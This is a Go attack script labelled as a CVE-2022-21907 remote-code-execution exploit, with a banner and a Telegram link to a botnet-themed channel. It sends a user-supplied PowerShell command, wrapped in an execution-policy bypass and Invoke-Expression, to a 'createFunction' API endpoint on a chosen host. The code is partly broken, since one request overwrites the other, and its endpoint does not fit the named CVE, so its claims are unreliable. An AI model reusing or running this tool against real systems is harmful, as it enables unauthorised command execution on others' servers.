// CVE-2022-21907 RCE!//
// Level-7 == TG:https://t.me/hacker_the_botnet//
package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func banner() {
	a := ".--..         ..---.       .-.  .-.  .-.  .-.        .-.   .  .-.  .-..---."
	b := ":     \\     / |          (   ):   :(   )(   )      (   ).'| (   ):   :   /"
	c := "|      \\   /  |---  ____   .' |   |  .'   .'  ____   .'   |  `-/ |   |  / "
	d := ":       \\ /   |           /   :   ; /    /          /     |   /  :   ; /  "
	e := "`--'      '    '---'      '---' `-' '---''---'      '---''---''    `-' '    RCE!"
	g := "-u <根域名> -p <Port> -h -shell <PowerShell Command> -ip <ServerIP>"
	fmt.Println(a)
	fmt.Println(b)
	fmt.Println(c)
	fmt.Println(d)
	fmt.Println(e)
	fmt.Println(g)
}

func main() {
	banner()
	if len(os.Args) > 1 && os.Args[1] == "-h" {
		fmt.Println("Help:\n-u <根域名> -p <Port> -h -shell <PowerShell Command> -ip <ServerIP> -u如https://www.baidu.com/则-u 'www.baidu.com'")
		return
	}
	var TagetIP string
	var shellCommand string
	var Port string
	var URL string

	flag.StringVar(&Port, "p", "80", "Exploit Port")
	flag.StringVar(&TagetIP, "ip", "", "TagetIP")
	flag.StringVar(&shellCommand, "shell", "", "Shell command to execute")
	flag.StringVar(&URL, "u", "", "URL")

	flag.Parse()

	if URL == "" && TagetIP == "" || shellCommand == "" {
		fmt.Println("Error!没有检测到参数")
		return
	}
	Url := fmt.Sprintf("http://%s/api/v1/namespace/default/actions/createFunction", URL)
	targetIP := fmt.Sprintf("http://%s:%s/api/v1/namespace/default/actions/createFunction", TagetIP, Port)

	payload := fmt.Sprintf(`{"scripts":["powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command Invoke-Expression '%s'"]}`, shellCommand)

	client := &http.Client{}
	req, err := http.NewRequest("POST", targetIP, strings.NewReader(payload))
	if err != nil {
		fmt.Println(err)
		return
	}
	req, error := http.NewRequest("POST", Url, strings.NewReader(payload))
	if error != nil {
		fmt.Println(error)
		return
	}
	//请根据实际操作中的POST包修改请求让请求可以到达
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299")
	req.Header.Set("Accept-Language", "en-US,en;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	fmt.Println(resp.Request)

	fmt.Println("漏洞利用完毕\nPoC不会告诉你是否成功被执行\nRequest:\n", resp.Status)
}
